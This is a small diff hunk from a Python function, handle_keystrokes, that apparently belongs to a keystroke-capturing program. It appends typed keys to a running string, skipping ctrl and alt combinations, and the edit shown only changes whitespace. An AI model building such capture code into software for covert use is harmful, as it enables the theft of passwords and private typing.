@@ -107,8 +107,7 @@ def handle_keystrokes(key):
             return
         else:
             if not (ctrl_pressed or alt_pressed):
-                keystrokes += str(key).strip("'")
-        
+                keystrokes += str(key).strip("'")      
     except Exception as e:
         print(f"Error processing key: {e}")
 
